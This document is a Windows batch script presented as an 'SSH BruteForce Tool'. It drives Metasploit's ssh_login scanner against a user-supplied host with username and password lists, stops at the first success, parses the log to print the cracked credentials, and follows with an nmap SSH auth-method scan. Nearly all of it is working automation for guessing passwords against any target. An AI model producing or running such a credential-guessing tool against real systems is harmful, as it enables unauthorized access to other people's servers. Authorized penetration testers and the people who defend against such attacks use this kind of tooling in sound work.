@echo off
setlocal enabledelayedexpansion
if exist ssh.log del ssh.log
if exist ssh.rc del ssh.rc
:: basic checks for required tools
where msfconsole >nul 2>&1
if %errorlevel% == 0 (
    echo Metasploit is installed
    timeout /t 1 >nul
    cls
) else (
    echo Metasploit is not installed. Please install Metasploit and try again.
    echo get it here: https://metasploit.help.rapid7.com/docs/installing-the-metasploit-framework
    timeout /t 2 >nul
    exit /b 1
)
where nmap >nul 2>&1
if %errorlevel% == 0 (
    echo nmap is installed
    timeout /t 1 >nul
    cls
) else (
    echo nmap is not installed. Please install nmap and try again.
    echo get it here: https://nmap.org/download.html
    timeout /t 2 >nul
    exit /b 1
)
title SSH tool
color 0a
echo =====================================================================
echo  Author:              Soggal1ng
echo  Description:    SSH BruteForce Tool
echo  Version:                1.0
echo ======================================================================
echo Enter Target IP Address or Hostname:
set /p target=">> "
echo Enter Username List:
set /p userlist=">> "
echo Enter Password List:
set /p passlist=">> "
echo use auxiliary/scanner/ssh/ssh_login > ssh.rc
echo set RHOSTS %target% >> ssh.rc
echo set USER_FILE %userlist% >> ssh.rc
echo set PASS_FILE %passlist% >> ssh.rc
echo set STOP_ON_SUCCESS true >> ssh.rc
echo spool ssh.log >> ssh.rc
echo run >> ssh.rc
echo spool off >> ssh.rc
echo exit -y >> ssh.rc
msfconsole -r ssh.rc
timeout /t 4 /nobreak >nul
set "user="
set "pass="
if not exist ssh.log (
    echo ssh.log doesnt exist bruh
    goto skip
)
for /f "tokens=*" %%a in (ssh.log) do (
    echo %%a | findstr /i "Success:" >nul
    if !errorlevel! equ 0 (
        for /f "tokens=2 delims='" %%b in ("%%a") do (
            for /f "tokens=1,2 delims=:" %%c in ("%%b") do (
                set "user=%%c"
                set "pass=%%d"
                goto done
            )
        )
    )
)
:done
:skip
echo ======================================================================
echo Username: %user%
echo Password: %pass%
nmap -p 22 --script ssh-auth-methods %target%
echo ======================================================================
echo Scan Complete. Press any key to exit.
pause
